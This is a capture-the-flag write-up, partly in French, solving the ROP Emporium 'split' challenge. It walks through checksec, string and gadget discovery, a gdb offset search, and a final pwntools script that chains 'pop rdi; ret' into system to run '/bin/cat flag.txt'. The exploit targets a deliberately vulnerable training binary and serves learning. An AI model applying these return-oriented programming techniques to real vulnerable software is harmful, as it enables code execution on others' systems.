# split: simple rop 


https://ropemporium.com/binary/split.zip


## checksec 

```
$ checksec split
[*] '/home/yolo/yolo/BufferOverflows/ropemporium/02_split/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found     <-- easy overflow 
    NX:       NX enabled          <-- no payload, rop only
    PIE:      No PIE (0x400000)   <-- easy function call
```



## strings 

```
 strings split 


puts
printf
memset
read
stdout
system                <---
setvbuf

/bin/ls

/bin/cat flag.txt     <--- 

split.c
pwnme
usefulFunction
stdout@@GLIBC_2.2.5
puts@@GLIBC_2.2.5
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
memset@@GLIBC_2.2.5
read@@GLIBC_2.2.5
usefulString
main
```

Let Chain system & /bin/cat flag.txt 

## x64 calling convention 

 
+---------+------+------+------+------+------+------+
| syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
+---------+------+------+------+------+------+------+
|   %rax  | %rdi | %rsi | %rdx | %r10 | %r8  | %r9  |
+---------+------+------+------+------+------+------+

En x64 les arguments sont passés via les registres.
Il faut mettre l'adresse de "/bin/cat flag.txt" derrière un gadget "pop rdi; ret", avant d'appeler system()

Notre payload va être: 'A'*offset_padding + pop_rdi_gadget + cat_flag_addr + system_addr



## Trouver /bin/cat 


```
$ objdump -s split 

split:     format de fichier elf64-x86-64

...
Contenu de la section .data :
 601050 00000000 00000000 00000000 00000000  ................
 601060 2f62696e 2f636174 20666c61 672e7478  /bin/cat flag.tx
 601070 7400                                 t.              
```

```
[0x004005b0]> iz
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```

cat_flag_addr = 0x601060


## Trouver system()

```
$ r2 split
[0x004005b0]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Finding function preludes
[x] Enable constraint types analysis for variables
[0x004005b0]> afl
0x004005b0    1 42           entry0
0x004005f0    4 42   -> 37   sym.deregister_tm_clones
0x00400620    4 58   -> 55   sym.register_tm_clones
0x00400660    3 34   -> 29   entry.fini0
0x00400690    1 7            entry.init0
0x004006e8    1 90           sym.pwnme
0x00400580    1 6            sym.imp.memset
0x00400550    1 6            sym.imp.puts
0x00400570    1 6            sym.imp.printf
0x00400590    1 6            sym.imp.read
0x00400742    1 17           sym.usefulFunction
0x00400560    1 6            sym.imp.system
0x004007d0    1 2            sym.__libc_csu_fini
0x004007d4    1 9            sym._fini
0x00400760    4 101          sym.__libc_csu_init
0x004005e0    1 2            sym._dl_relocate_static_pie
0x00400697    1 81           main
0x004005a0    1 6            sym.imp.setvbuf
0x00400528    3 23           sym._init
[0x004005b0]> 
```
Si on appelle directement 0x00400560   sym.imp.system, ça ne passe pas
il faut passer par un callq 0x00400560   sym.imp.system

(pourquoi ?)

```
objdump -D split 
0000000000400742 <usefulFunction>:
  400742:	55                   	push   %rbp
  400743:	48 89 e5             	mov    %rsp,%rbp
  400746:	bf 4a 08 40 00       	mov    $0x40084a,%edi
  40074b:	e8 10 fe ff ff       	callq  400560 <system@plt>
  400750:	90                   	nop
  400751:	5d                   	pop    %rbp
  400752:	c3                   	retq   
  400753:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  40075a:	00 00 00 
  40075d:	0f 1f 00             	nopl   (%rax)
```

system_addr = 0x40074b 


## Trouver le gadget pop rdi, ret

```
$ ropper -f split | grep rdi
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x00000000004006d4: add byte ptr [rax], al; add byte ptr [rdi + 0x400806], bh; call 0x550; mov eax, 0; pop rbp; ret; 
0x00000000004006d6: add byte ptr [rdi + 0x400806], bh; call 0x550; mov eax, 0; pop rbp; ret; 
0x00000000004007c3: pop rdi; ret; 
```


```
[0x004005b0]> /a pop rdi, ret
Searching 1 byte in [0x601072-0x601088]
hits: 0
Searching 1 byte in [0x600e10-0x601072]
hits: 0
Searching 1 byte in [0x400000-0x4009e0]
hits: 12
0x004003e9 hit2_0 5f
0x004003ea hit2_1 5f
0x004003ef hit2_2 5f
0x004003f5 hit2_3 5f
0x00400400 hit2_4 5f
0x00400407 hit2_5 5f
0x00400408 hit2_6 5f
0x0040040d hit2_7 5f
0x00400413 hit2_8 5f
0x00400414 hit2_9 5f
0x004007c3 hit2_10 5f
0x00400801 hit2_11 5f
```

gadget_addr = 0x0004007c3  


## Payload 

gadget_addr = 0x0004007c3 
cat_flag_addr = 0x601060
system_addr = 0x0040074b 
'A'*offset_padding + pop_rdi_gadget + cat_flag_addr + system_addr

 
## Offset 


```
$ gdb split

gdb-peda$ pattern create 60
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA'
gdb-peda$ r 
Starting program: /home/yolo/yolo/BufferOverflows/ropemporium/02_split/split 
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA
Thank you!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RSP: 0x7fffffffdee8 ("AA0AAFAAbAA1AAGAAcAA\n\177")
[-------------------------------------code-------------------------------------]
   0x40073a <pwnme+82>:	call   0x400550 <puts@plt>
   0x40073f <pwnme+87>:	nop
   0x400740 <pwnme+88>:	leave  
=> 0x400741 <pwnme+89>:	ret  
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdee8 ("AA0AAFAAbAA1AAGAAcAA\n\177")

Stopped reason: SIGSEGV
0x0000000000400741 in pwnme ()
gdb-peda$ pattern offset AA0AAFAAbAA1AAGAAcAA
AA0AAFAAbAA1AAGAAcAA found at offset: 40
```


## Exploit with python3 and pwn 



```
#!/usr/bin/python3 


from pwn import *

elf = context.binary = ELF('split')
info("%#x system", elf.symbols.system)
system = p64(elf.symbols.system)
print_flag = p64(elf.symbols.usefulString)

io = process("./split")

offset_padding = 40
gadget_addr    = p64(0x004007c3) 
cat_flag_addr  = p64(0x00601060)
system_addr    = p64(0x0040074b)

payload = b'A'*offset_padding + gadget_addr + cat_flag_addr + system_addr

io.sendline(payload)
io.interactive()
```
